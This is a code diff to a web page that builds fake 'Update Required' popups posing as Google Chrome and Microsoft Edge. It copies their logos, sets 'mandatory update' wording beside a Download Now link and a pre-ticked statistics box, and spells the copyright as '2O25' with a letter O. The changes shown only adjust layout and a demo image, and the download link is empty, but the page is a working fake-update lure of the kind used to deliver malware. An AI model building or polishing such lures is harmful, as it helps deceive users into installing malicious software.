@@ -54,6 +54,15 @@
       font-size: 1.25rem;
       font-weight: 400;
       letter-spacing: normal;
+      max-width: 60%;
+    }
+
+    .leftTXT {
+        float: left;
+    }
+
+    .rightTXT {
+        float: right;
     }
 
     .chromeheader {
@@ -136,15 +145,20 @@
     }
 
     .edge img {
-      width: 100px;
-      margin: 20px;
+        width: 100px;        
     }
 
     #edge-pic {
-    width: 500px;
-    padding-top: 10%;
-    padding-bottom: 5%;
-    padding-left: 10%;
+        width: 90%;
+      margin-left: 40px;
+    }
+
+    .imagedemo {
+        display: flex;
+        flex-wrap: wrap;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
     }
 
     .div {
@@ -1217,14 +1231,14 @@ Program</span></span></span></span></span></span></span></span></span></h1></div
           logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Google_Chrome_icon_%28February_2022%29.svg/2048px-Google_Chrome_icon_%28February_2022%29.svg.png";  
           popupHtml = `
             <img src="${logoUrl}" alt="Logo" /><h1 class="chromeheader">Update Required</h1><br><p>Your Chrome version does not include the latest update and, therefore, websites may not function as excpected. <br> <br> To continue using Chrome, please install the mandatory update to recieve the latest version of Google Chrome.</p> <br>
-            <p class="chromever">Current Version: ${version} | Latest Update: ${latestUpdate}</p><br><br><a href="${downloadLink}" class="chrome-download-link" target="_blank">Download Now</a><br><br><input checked="true" type="checkbox" id="scales" name="scales" checked /><label for="scales">Help make Google Chrome better by automatically sending usage statistics and crash reports to Google.</label><br><br><p>© 2O25 Google LLC⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Privacy · Terms</p>`;
+            <p class="chromever">Current Version: ${version} | Latest Update: ${latestUpdate}</p><br><br><a href="${downloadLink}" class="chrome-download-link" target="_blank">Download Now</a><br><br><input checked="true" type="checkbox" id="scales" name="scales" checked /><label for="scales">Help make Google Chrome better by automatically sending usage statistics and crash reports to Google.</label><br><br><p class="leftTXT">© 2O25 Google LLC</p><p class="rightTXT">Privacy · Terms</p>`;
           popupClass = "chrome";
           downloadLink = "";
           break;
         case "Microsoft Edge":
           logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Microsoft_Edge_logo_%282019%29.svg/1200px-Microsoft_Edge_logo_%282019%29.svg.png";
           popupHtml = `
-            <div class="popupwrapper" id="popupwrapper"><div class="div" id="div"><img src="${logoUrl}" alt="Logo" /><h1 class="edgeheader">Update Required</h1><br><p>Your Edge version does not include the latest update and, therefore, websites may not function as excpected. <br> <br> To continue using Edge, please install the mandatory update to recieve the latest version of Microsoft Edge.</p><br><p class="edgever">Current Version: ${version} | Latest Update: ${latestUpdate}</p><br><br><a href="${downloadLink}" class="edge-download-link" target="_blank">Download Now</a><br><br><input checked="true" type="checkbox" id="scales" name="scales" checked /><label for="scales">Help make Microsoft Edge better by automatically sending usage statistics and crash reports to Microsoft.</label><br><br><p>© 2O25 Microsoft LLC⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Privacy · Terms</p></div><div class="imagedemo" id="imagedemo"><img class="edge-pic" id="edge-pic" src="https://i.ibb.co/39L7RqbZ/testimg.png"></img></div></div>`;
+            <div class="popupwrapper" id="popupwrapper"><div class="div" id="div"><img src="${logoUrl}" alt="Logo" /><h1 class="edgeheader">Update Required</h1><br><p>Your Edge version does not include the latest update and, therefore, websites may not function as excpected. <br> <br> To continue using Edge, please install the mandatory update to recieve the latest version of Microsoft Edge.</p><br><p class="edgever">Current Version: ${version} | Latest Update: ${latestUpdate}</p><br><br><a href="${downloadLink}" class="edge-download-link" target="_blank">Download Now</a><br><br><input checked="true" type="checkbox" id="scales" name="scales" checked /><label for="scales">Help make Microsoft Edge better by automatically sending usage statistics and crash reports to Microsoft.</label><br><br><p class="leftTXT">© 2O25 Microsoft LLC</p><p class="rightTXT">Privacy · Terms</p></div><div class="imagedemo" id="imagedemo"><img class="edge-pic" id="edge-pic" src="https://i.ibb.co/FN36wMV/Untitled-design-2.png"></img></div></div>`;
             popupClass = "edge";
             downloadLink = "";
             logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Microsoft_Edge_logo_%282019%29.svg/1200px-Microsoft_Edge_logo_%282019%29.svg.png";
